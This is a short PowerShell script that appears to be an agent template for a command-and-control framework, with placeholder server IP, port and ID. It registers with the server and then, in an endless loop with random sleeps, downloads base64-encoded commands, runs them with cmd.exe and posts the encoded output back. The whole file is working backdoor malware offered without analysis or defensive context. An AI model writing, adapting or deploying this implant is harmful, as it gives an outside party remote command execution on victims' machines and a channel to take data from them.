$ip = "REPLACE_IP"
$port = "REPLACE_PORT"
$id = "REPLACE_ID"

$reguri = ("http" + ':' + "//$ip" + ':' + "$port/reg/$id")
$name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'POST').Content


if ($name -eq "Success"){
$taskuri = ("http" + ':' + "//$ip" + ':' + "$port/task/$id")
$responseuri = ("http" + ':' + "//$ip" + ':' + "$port/task/results/$id")
for (;;) {
$n  = Get-Random -Maximum 20
$task = (Invoke-WebRequest -UseBasicParsing -Uri $taskuri  -Method 'GET').Content

if ($task -ne "0") {

$dtask = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task))
$res = cmd.exe /c $dtask

$data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$res"))
$data = "results= $data"
$response = (Invoke-WebRequest -UseBasicParsing -Uri $responseuri -body $data -Method 'POST').Content
    }
sleep $n
} } 
